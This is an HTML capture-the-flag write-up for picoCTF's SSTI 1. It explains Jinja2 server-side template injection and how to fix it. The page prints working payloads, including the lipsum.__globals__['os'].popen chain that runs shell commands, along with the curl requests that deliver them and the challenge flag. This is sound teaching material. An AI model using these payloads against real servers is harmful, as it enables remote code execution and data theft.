@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SSTI 1 | Amidst CTF Write-up</title>
+  <link rel="icon" type="image/png" href="../assets/kafka-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+  <nav class="navbar scrolled" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html#home" class="nav-logo">
+        <img src="../assets/kafka-icon.png" alt="Logo" class="nav-icon">
+        <span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span>
+      </a>
+      <ul class="nav-menu">
+        <li><a href="../index.html#home">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#skills">Skills</a></li>
+        <li><a href="../index.html#certifications">Certs</a></li>
+        <li><a href="../index.html#ctf" class="active">CTF</a></li>
+        <li><a href="../index.html#bugbounty">Bug Bounty</a></li>
+        <li><a href="../index.html#labs">Labs</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <section class="writeup-header">
+    <div class="container">
+      <a href="../index.html#ctf" class="writeup-back"><i class="fas fa-arrow-left"></i> Back to Write-ups</a>
+      <h1>SSTI 1</h1>
+      <div class="writeup-meta">
+        <span class="ctf-category web">Web Exploitation</span>
+        <span class="ctf-difficulty easy">Easy</span>
+        <span style="color: var(--text-muted); font-size: 0.85rem;"><i class="fas fa-flag" style="margin-right:5px;"></i>picoCTF</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="writeup-body">
+    <div class="container">
+      <div class="writeup-content">
+        <h2 id="challenge-info">Challenge Info</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>SSTI 1</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web Exploitation</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>picoCTF</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>http://rescued-float.picoctf.net:50062/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Description:</strong>
+I made a cool website where you can announce whatever you want! I heard templating is a cool and modular way to build web apps!</p>
+<hr />
+<h2 id="what-is-ssti">What is SSTI?</h2>
+<p><strong>Server-Side Template Injection (SSTI)</strong> is a vulnerability that occurs when user input is directly embedded into a server-side template without sanitization. Instead of treating the input as plain text, the server interprets it as template code and executes it.</p>
+<p>In this challenge, the app uses <strong>Flask</strong> (Python) with <strong>Jinja2</strong> as the template engine.</p>
+<hr />
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-test-for-ssti">Step 1: Test for SSTI</h3>
+<p>The website has a simple form where you can type an announcement. The first thing to try is a basic math expression using Jinja2 template syntax:</p>
+<pre><code>{{7*7}}
+</code></pre>
+<p>If the page displays <code>49</code> instead of <code>{{7*7}}</code>, the server is evaluating our input as template code — confirming SSTI.</p>
+<pre><code class="language-bash">curl -s -X POST -L http://rescued-float.picoctf.net:50062/ -d 'content={{7*7}}'
+</code></pre>
+<p><strong>Result:</strong> The page displays <code>49</code>. SSTI confirmed!</p>
+<hr />
+<h3 id="step-2-understand-why-its-vulnerable">Step 2: Understand Why It's Vulnerable</h3>
+<p>Looking at the source code (<code>/challenge/app.py</code>), the vulnerability is in the <code>/announce</code> route:</p>
+<pre><code class="language-python">@app.route(&quot;/announce&quot;, methods=[&quot;POST&quot;])
+def announcement():
+    return render_template_string(&quot;&quot;&quot;
+        &lt;!doctype html&gt;
+        &lt;h1 style=&quot;font-size:100px;&quot; align=&quot;center&quot;&gt;&quot;&quot;&quot; +
+          request.form.get(&quot;content&quot;, &quot;&quot;) +
+        &quot;&quot;&quot;&lt;/h1&gt;&quot;&quot;&quot;)
+</code></pre>
+<p>The user input (<code>request.form.get("content")</code>) is <strong>directly concatenated</strong> into the template string before rendering. This means any Jinja2 syntax in our input will be executed by the server.</p>
+<p>The safe way would be to pass the variable separately:</p>
+<pre><code class="language-python"># SAFE - input is treated as data, not code
+render_template_string(&quot;&lt;h1&gt;{{ content }}&lt;/h1&gt;&quot;, content=user_input)
+</code></pre>
+<hr />
+<h3 id="step-3-achieve-remote-code-execution-rce">Step 3: Achieve Remote Code Execution (RCE)</h3>
+<p>Now that we can execute Jinja2 expressions, we need to escalate this to run system commands so we can read the flag file.</p>
+<p>In Jinja2, there is a built-in function called <code>lipsum</code> (normally used to generate Lorem Ipsum text). It's a Python function, which means it has a <code>__globals__</code> dictionary that contains a reference to the <code>os</code> module. We can use this to execute shell commands.</p>
+<p><strong>List the root directory:</strong></p>
+<pre><code>{{lipsum.__globals__['os'].popen('ls /').read()}}
+</code></pre>
+<pre><code class="language-bash">curl -s -X POST -L http://rescued-float.picoctf.net:50062/ \
+  --data-urlencode &quot;content={{lipsum.__globals__['os'].popen('ls /').read()}}&quot;
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>bin boot challenge dev etc home lib ...
+</code></pre>
+<p>We can see a <code>/challenge</code> directory. Let's look inside:</p>
+<pre><code>{{lipsum.__globals__['os'].popen('ls /challenge').read()}}
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>__pycache__  app.py  flag  requirements.txt
+</code></pre>
+<p>There's a file called <code>flag</code>.</p>
+<hr />
+<h3 id="step-4-read-the-flag">Step 4: Read the Flag</h3>
+<pre><code>{{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}
+</code></pre>
+<pre><code class="language-bash">curl -s -X POST -L http://rescued-float.picoctf.net:50062/ \
+  --data-urlencode &quot;content={{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}&quot;
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
+</code></pre>
+<hr />
+<h2 id="flag">Flag</h2>
+<pre><code>picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
+</code></pre>
+<hr />
+<h2 id="how-the-exploit-chain-works">How the Exploit Chain Works</h2>
+<pre><code>User Input → String Concatenation → render_template_string() → Jinja2 Engine Executes Code
+</code></pre>
+<ol>
+<li>We type <code>{{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}</code> into the form</li>
+<li>The server concatenates it directly into the template string</li>
+<li>Jinja2 sees <code>{{ }}</code> and evaluates the expression inside</li>
+<li><code>lipsum.__globals__['os']</code> gives us access to Python's <code>os</code> module</li>
+<li><code>os.popen('cat /challenge/flag').read()</code> runs the shell command and returns the output</li>
+<li>The flag is rendered on the page</li>
+</ol>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>Never concatenate user input into templates.</strong> Always pass user data as variables using the template engine's built-in escaping mechanism.</p>
+</li>
+<li>
+<p><strong>SSTI can lead to full RCE.</strong> What looks like a simple text display feature can give an attacker complete control over the server if template injection exists.</p>
+</li>
+<li>
+<p><strong>Test with <code>{{7*7}}</code></strong> — This is the standard first test for SSTI. If you see <code>49</code>, dig deeper.</p>
+</li>
+<li>
+<p><strong><code>lipsum</code> is a common Jinja2 SSTI vector.</strong> It's a built-in function available in all Jinja2 templates, and its <code>__globals__</code> dictionary provides access to the <code>os</code> module without needing to traverse Python's class hierarchy.</p>
+</li>
+</ol>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-logo"><span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span></p>
+        <p class="footer-copy">&copy; 2026 Amidst. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
